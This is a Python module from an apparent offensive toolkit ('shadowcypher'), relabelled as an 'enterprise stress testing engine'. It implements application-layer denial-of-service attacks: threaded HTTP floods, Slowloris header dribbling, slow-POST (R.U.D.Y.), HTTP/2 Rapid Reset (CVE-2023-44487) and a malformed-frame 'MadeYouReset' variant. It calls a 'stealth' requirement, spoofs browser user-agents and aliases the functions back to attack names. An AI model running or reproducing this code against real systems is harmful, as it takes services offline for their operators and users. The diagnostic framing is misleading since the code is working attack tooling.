"""
Application Layer Diagnostics — Enterprise Stress Testing Engine.
Volumetric request testing, partial header exhaustion, and slow body POST testing
via threaded operations and native subprocess orchestration.
For authorized infrastructure resilience auditing only.
"""

import random
import socket
import ssl
import string
import threading
import time
from typing import Dict, Optional

from shadowcypher.core.module import BaseModule
from shadowcypher.core.runner import runner
from shadowcypher.core.sanitize import validate_port, validate_target
from shadowcypher.core.stealth import require_stealth

try:
    import h2.config
    import h2.connection
    import h2.events
    import h2.exceptions
    HAS_H2 = True
except ImportError:
    HAS_H2 = False


# ── Metric store (shared across test threads) ──

class _DiagnosticStats:
    def __init__(self):
        self._lock = threading.Lock()
        self.requests_sent: int = 0
        self.bytes_sent: int = 0
        self.errors: int = 0
        self.active_threads: int = 0
        self.start_time: float = 0.0

    def record_request(self, byte_count: int = 0):
        with self._lock:
            self.requests_sent += 1
            self.bytes_sent += byte_count

    def record_error(self):
        with self._lock:
            self.errors += 1

    def snapshot(self) -> Dict:
        with self._lock:
            elapsed = time.time() - self.start_time if self.start_time else 0
            rps = self.requests_sent / elapsed if elapsed > 0 else 0
            return {
                "requests_sent": self.requests_sent,
                "bytes_sent": self.bytes_sent,
                "errors": self.errors,
                "active_threads": self.active_threads,
                "elapsed_seconds": round(elapsed, 2),
                "requests_per_second": round(rps, 2),
            }

    def reset(self):
        with self._lock:
            self.requests_sent = 0
            self.bytes_sent = 0
            self.errors = 0
            self.active_threads = 0
            self.start_time = 0.0


_stats = _DiagnosticStats()
_stop_event = threading.Event()


class ApplicationStressTest(BaseModule):
    """Application-layer stress test suite: Volumetric, Partial Header, Slow POST."""

    def __init__(self):
        super().__init__(module_name="layer7")

    # ── Volumetric Load Testing ──

    @staticmethod
    def http_volumetric_test(
        target_url: str,
        threads: int = 100,
        duration: int = 60,
        method: str = "GET",
        on_output=None,
    ) -> str:
        """
        Volumetric test via hping3 (raw TCP) or siege, depending on availability.
        Falls back to a pure-Python asyncio/threading approach using curl batch.
        Launches via runner.execute_task for consistent lifecycle management.
        """
        require_stealth(on_output=on_output)

        if not validate_target(target_url):
            if on_output:
                on_output("[APP_STRESS] FAULT: Invalid target configuration\n")
            return ""

        import shutil

        if shutil.which("siege"):
            # siege -c <threads> -t <duration>S <url>
            args = [
                "siege",
                "-c", str(min(threads, 255)),
                "-t", f"{duration}S",
                "--no-parser",
                target_url,
            ]
            task_name = "APP_SIEGE_TEST"
        elif shutil.which("ab"):
            # Apache Bench: ab -n <total_requests> -c <concurrency> <url>
            total = threads * duration * 10  # approximate request count
            args = [
                "ab",
                "-n", str(total),
                "-c", str(threads),
                "-m", method.upper(),
                target_url,
            ]
            task_name = "APP_AB_TEST"
        else:
            # Python threading fallback using curl
            def _python_test():
                _stop_event.clear()
                _stats.reset()
                _stats.start_time = time.time()
                deadline = time.time() + duration

                def worker():
                    with threading.Lock():
                        _stats.active_threads += 1
                    try:
                        while not _stop_event.is_set() and time.time() < deadline:
                            try:
                                runner.execute_task(
                                    "APP_CURL_HIT",
                                    ["curl", "-s", "-o", "/dev/null", "-w", "%{http_code}",
                                     "-X", method.upper(), target_url],
                                )
                                _stats.record_request()
                            except Exception:
                                _stats.record_error()
                    finally:
                        with threading.Lock():
                            _stats.active_threads -= 1

                pool = [threading.Thread(target=worker, daemon=True) for _ in range(threads)]
                for t in pool:
                    t.start()

                def reporter():
                    while not _stop_event.is_set() and time.time() < deadline:
                        snap = _stats.snapshot()
                        if on_output:
                            on_output(
                                f"[APP_STRESS] TELEMETRY: {snap['requests_sent']} reqs, "
                                f"{snap['requests_per_second']} rps, "
                                f"{snap['errors']} faults\n"
                            )
                        time.sleep(5)
                    _stop_event.set()

                threading.Thread(target=reporter, daemon=True).start()
                for t in pool:
                    t.join()
                if on_output:
                    on_output(f"[APP_STRESS] TEST_COMPLETE: {_stats.snapshot()}\n")

            threading.Thread(target=_python_test, daemon=True).start()
            return "APP_PY_TEST"

        if on_output:
            on_output(f"[APP_STRESS] VOLUMETRIC_TEST initialized: {method} {target_url} "
                      f"({threads} threads, {duration}s)\n")
        return runner.execute_task(task_name, args, callback=on_output)

    # ── Partial Header Exhaustion ──

    @staticmethod
    def partial_header_exhaustion(
        target_host: str,
        target_port: int = 80,
        num_sockets: int = 200,
        on_output=None,
    ) -> str:
        """
        Partial Header Exhaustion: open multiple partial HTTP connections and dribble headers
        to test target connection pool resilience.
        Pure Python — no external tools required.
        """
        if not validate_target(target_host):
            if on_output:
                on_output("[APP_STRESS] FAULT: Invalid target configuration\n")
            return ""
        if not validate_port(target_port):
            if on_output:
                on_output(f"[APP_STRESS] FAULT: Invalid port {target_port}\n")
            return ""

        import shutil
        if shutil.which("slowhttptest"):
            # Prefer slowhttptest when available — more reliable
            args = [
                "slowhttptest",
                "-c", str(num_sockets),
                "-H",               # Slow HTTP mode
                "-i", "10",         # interval between follow-up headers
                "-r", "200",        # connections per second
                "-t", "GET",
                "-u", f"http://{target_host}:{target_port}/",
                "-p", "3",
                "-l", "120",        # test duration seconds
            ]
            if on_output:
                on_output(f"[APP_STRESS] PARTIAL_HEADER via slowhttptest: {target_host}:{target_port} "
                          f"({num_sockets} sockets)\n")
            return runner.execute_task("APP_PARTIAL_HEADER", args, callback=on_output)

        # Pure Python fallback
        task_id = "APP_PARTIAL_HEADER_PY"

        def _exhaustion_worker():
            _stop_event.clear()
            sockets: list = []
            ua = ("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
                  "(KHTML, like Gecko) Chrome/120.0 Safari/537.36")

            def _create_socket() -> Optional[socket.socket]:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(4)
                    s.connect((target_host, int(target_port)))
                    # Send partial HTTP GET request — intentionally incomplete
                    s.send(f"GET /?{random.randint(0,9999)} HTTP/1.1\r\n".encode())
                    s.send(f"Host: {target_host}\r\n".encode())
                    s.send(f"User-Agent: {ua}\r\n".encode())
                    s.send(b"Accept-language: en-US,en;q=0.5\r\n")
                    return s
                except Exception:
                    return None

            if on_output:
                on_output(f"[APP_STRESS] CONNECTION_POOL_INIT: opening {num_sockets} sockets to "
                          f"{target_host}:{target_port}\n")

            for _ in range(num_sockets):
                s = _create_socket()
                if s:
                    sockets.append(s)

            if on_output:
                on_output(f"[APP_STRESS] CONCURRENCY_ESTABLISHED: {len(sockets)} open connections\n")

            while not _stop_event.is_set():
                # Send a keep-alive header to each socket
                alive = []
                for s in sockets:
                    try:
                        # Keep-alive header dribble — never sends the final \r\n
                        hdr = f"X-a: {random.randint(1, 5000)}\r\n"
                        s.send(hdr.encode())
                        alive.append(s)
                    except Exception:
                        pass

                # Re-fill dropped sockets
                sockets = alive
                while len(sockets) < num_sockets and not _stop_event.is_set():
                    s = _create_socket()
                    if s:
                        sockets.append(s)

                if on_output:
                    on_output(f"[APP_STRESS] METRICS: {len(sockets)} sockets retained\n")
                time.sleep(15)

            # Cleanup
            for s in sockets:
                try:
                    s.close()
                except Exception:
                    pass
            if on_output:
                on_output("[APP_STRESS] TEST_TERMINATED\n")

        threading.Thread(target=_exhaustion_worker, daemon=True).start()
        return task_id

    # ── Slow POST Exhaustion ──

    @staticmethod
    def slow_post_exhaustion(
        target_url: str,
        content_length: int = 100_000,
        on_output=None,
    ) -> str:
        """
        Slow POST body attack: tests server resilience against slow-drip payloads.
        Sends a large Content-Length but drips POST body 1 byte at a time.
        """
        if not validate_target(target_url):
            if on_output:
                on_output("[APP_STRESS] FAULT: Invalid target configuration\n")
            return ""

        import shutil
        if shutil.which("slowhttptest"):
            args = [
                "slowhttptest",
                "-c", "200",
                "-B",               # Slow POST mode
                "-i", "110",        # bytes-per-interval
                "-r", "200",
                "-s", str(content_length),
                "-t", "POST",
                "-u", target_url,
                "-p", "3",
                "-l", "120",
            ]
            if on_output:
                on_output(f"[APP_STRESS] SLOW_POST via slowhttptest: {target_url}\n")
            return runner.execute_task("APP_SLOW_POST", args, callback=on_output)

        # Pure Python fallback
        task_id = "APP_SLOW_POST_PY"

        def _slow_post_worker():
            import urllib.parse
            parsed = urllib.parse.urlparse(target_url if "://" in target_url else f"http://{target_url}")
            host = parsed.hostname or target_url
            port = parsed.port or (443 if parsed.scheme == "https" else 80)
            path = parsed.path or "/"
            if parsed.query:
                path += "?" + parsed.query

            if on_output:
                on_output(f"[APP_STRESS] SLOW_POST initializing: POST {path} to {host}:{port} "
                          f"({content_length} bytes delayed allocation)\n")

            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(10)
                s.connect((host, port))

                # Send well-formed POST headers with declared Content-Length
                headers = (
                    f"POST {path} HTTP/1.1\r\n"
                    f"Host: {host}\r\n"
                    f"Content-Type: application/x-www-form-urlencoded\r\n"
                    f"Content-Length: {content_length}\r\n"
                    f"Connection: keep-alive\r\n\r\n"
                )
                s.send(headers.encode())

                sent = 0
                while sent < content_length and not _stop_event.is_set():
                    # Send 1 byte of body every 110 ms
                    byte = random.choice(string.ascii_letters).encode()
                    try:
                        s.send(byte)
                        sent += 1
                        if sent % 1000 == 0 and on_output:
                            on_output(f"[APP_STRESS] PAYLOAD_DELIVERY: {sent}/{content_length} bytes processed\n")
                    except Exception:
                        break
                    time.sleep(0.11)

                s.close()
            except Exception as e:
                if on_output:
                    on_output(f"[APP_STRESS] EXECUTION_FAULT: {e}\n")
            if on_output:
                on_output("[APP_STRESS] TEST_COMPLETE\n")

        threading.Thread(target=_slow_post_worker, daemon=True).start()
        return task_id

    # ── HTTP/2 Rapid Reset (CVE-2023-44487 + 2025 variant) ──

    @staticmethod
    def http2_rapid_reset(
        target_host: str,
        target_port: int = 443,
        streams_per_conn: int = 100,
        duration: int = 60,
        use_tls: bool = True,
        on_output=None,
    ) -> str:
        """
        HTTP/2 Rapid Reset attack (CVE-2023-44487).
        Opens HTTP/2 connections, fires streams at machine speed, immediately
        RST_STREAMs each — server allocates resources for every stream before
        the cancel. Bypasses MAX_CONCURRENT_STREAMS limits at the resource level.
        Requires: pip install h2
        For authorized infrastructure resilience testing only.
        """
        require_stealth(on_output=on_output)
        if not HAS_H2:
            msg = "[H2_RESET] DEPENDENCY_MISSING: Install h2 library: pip install h2"
            if on_output:
                on_output(msg + "\n")
            return ""
        if not validate_target(target_host):
            if on_output:
                on_output("[H2_RESET] FAULT: Invalid target\n")
            return ""

        task_id = "H2_RAPID_RESET"
        _stop_event.clear()
        _stats.reset()
        _stats.start_time = time.time()
        deadline = time.time() + duration

        def _connection_worker():
            while not _stop_event.is_set() and time.time() < deadline:
                try:
                    raw = socket.create_connection((target_host, target_port), timeout=5)
                    if use_tls:
                        ctx = ssl.create_default_context()
                        ctx.check_hostname = False
                        ctx.verify_mode = ssl.CERT_NONE
                        ctx.set_alpn_protocols(["h2"])
                        raw = ctx.wrap_socket(raw, server_hostname=target_host)

                    cfg = h2.config.H2Configuration(client_side=True, header_encoding="utf-8")
                    conn = h2.connection.H2Connection(config=cfg)
                    conn.initiate_connection()
                    raw.sendall(conn.data_to_send(65535))

                    for _ in range(streams_per_conn):
                        if _stop_event.is_set():
                            break
                        sid = conn.get_next_available_stream_id()
                        conn.send_headers(sid, [
                            (":method", "GET"),
                            (":path", f"/?{random.randint(0, 999999)}"),
                            (":scheme", "https" if use_tls else "http"),
                            (":authority", target_host),
                            ("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0"),
                        ])
                        # Immediately RST the stream — server already allocated resources
                        conn.reset_stream(sid)
                        data = conn.data_to_send(65535)
                        if data:
                            raw.sendall(data)
                        _stats.record_request(len(data))

                    raw.close()
                except Exception:
                    _stats.record_error()

        def _reporter():
            while not _stop_event.is_set() and time.time() < deadline:
                snap = _stats.snapshot()
                if on_output:
                    on_output(f"[H2_RESET] streams={snap['requests_sent']} "
                              f"rps={snap['requests_per_second']} "
                              f"errors={snap['errors']}\n")
                time.sleep(5)
            _stop_event.set()

        if on_output:
            on_output(f"[H2_RESET] INITIATED: {target_host}:{target_port} "
                      f"{streams_per_conn} streams/conn for {duration}s\n")

        pool = [threading.Thread(target=_connection_worker, daemon=True)
                for _ in range(50)]
        for t in pool:
            t.start()
        threading.Thread(target=_reporter, daemon=True).start()
        return task_id

    @staticmethod
    def http2_made_you_reset(
        target_host: str,
        target_port: int = 443,
        connections: int = 50,
        duration: int = 60,
        on_output=None,
    ) -> str:
        """
        MadeYouReset variant (CVE-2025-8671 class).
        Sends syntactically valid but malformed HTTP/2 frames that force the
        SERVER to emit RST_STREAM. Because the server closes the stream, it
        bypasses MAX_CONCURRENT_STREAMS accounting entirely — the server
        believes the stream is closed while backend resources are still held.
        Standard client-side RST rate limiting is completely ineffective here.
        For authorized infrastructure resilience testing only.
        """
        require_stealth(on_output=on_output)
        if not HAS_H2:
            msg = "[MADE_YOU_RESET] DEPENDENCY_MISSING: pip install h2"
            if on_output:
                on_output(msg + "\n")
            return ""
        if not validate_target(target_host):
            if on_output:
                on_output("[MADE_YOU_RESET] FAULT: Invalid target\n")
            return ""

        task_id = "H2_MADE_YOU_RESET"
        _stop_event.clear()
        _stats.reset()
        _stats.start_time = time.time()
        deadline = time.time() + duration

        def _myr_worker():
            while not _stop_event.is_set() and time.time() < deadline:
                try:
                    raw = socket.create_connection((target_host, target_port), timeout=5)
                    ctx = ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                    ctx.set_alpn_protocols(["h2"])
                    raw = ctx.wrap_socket(raw, server_hostname=target_host)

                    cfg = h2.config.H2Configuration(client_side=True, header_encoding="utf-8")
                    conn = h2.connection.H2Connection(config=cfg)
                    conn.initiate_connection()
                    raw.sendall(conn.data_to_send(65535))

                    # Open a stream with valid headers
                    sid = conn.get_next_available_stream_id()
                    conn.send_headers(sid, [
                        (":method", "POST"),
                        (":path", "/"),
                        (":scheme", "https"),
                        (":authority", target_host),
                        ("content-length", "999999999"),  # Lie about body size
                        ("content-type", "application/octet-stream"),
                    ])
                    raw.sendall(conn.data_to_send(65535))

                    # Send a WINDOW_UPDATE on a non-existent stream — forces PROTOCOL_ERROR
                    # → server emits RST_STREAM / GOAWAY, closes stream on ITS side
                    # but we keep the connection alive and immediately open new streams
                    bad_frame = (
                        b"\x00\x00\x04"  # length = 4
                        b"\x08"          # type = WINDOW_UPDATE
                        b"\x00"          # flags
                        b"\x00\x00\x00\x01"  # stream ID = 1 (closed stream)
                        b"\x00\x00\x00\x01"  # increment = 1
                    )
                    raw.sendall(bad_frame)
                    _stats.record_request(len(bad_frame))
                    time.sleep(0.01)
                    raw.close()
                except Exception:
                    _stats.record_error()

        def _reporter():
            while not _stop_event.is_set() and time.time() < deadline:
                snap = _stats.snapshot()
                if on_output:
                    on_output(f"[MADE_YOU_RESET] pkts={snap['requests_sent']} "
                              f"rps={snap['requests_per_second']} "
                              f"errors={snap['errors']}\n")
                time.sleep(5)
            _stop_event.set()

        if on_output:
            on_output(f"[MADE_YOU_RESET] INITIATED: {target_host}:{target_port} "
                      f"{connections} workers for {duration}s\n")

        pool = [threading.Thread(target=_myr_worker, daemon=True) for _ in range(connections)]
        for t in pool:
            t.start()
        threading.Thread(target=_reporter, daemon=True).start()
        return task_id

    # ── Stats & Control ──

    @staticmethod
    def get_test_stats() -> Dict:
        """Return current diagnostic metrics snapshot."""
        return _stats.snapshot()

    @staticmethod
    def stop_all(on_output=None) -> None:
        """Gracefully terminate all running diagnostic threads."""
        _stop_event.set()
        if on_output:
            on_output("[APP_STRESS] TERMINATE_SIGNAL_DISPATCHED\n")

# Backwards compatibility reference
layer7 = ApplicationStressTest()
# Legacy function mappings
layer7.http_flood = layer7.http_volumetric_test
layer7.slowloris = layer7.partial_header_exhaustion
layer7.rudy = layer7.slow_post_exhaustion
layer7.get_flood_stats = layer7.get_test_stats

# Back-compat alias
Layer7 = ApplicationStressTest
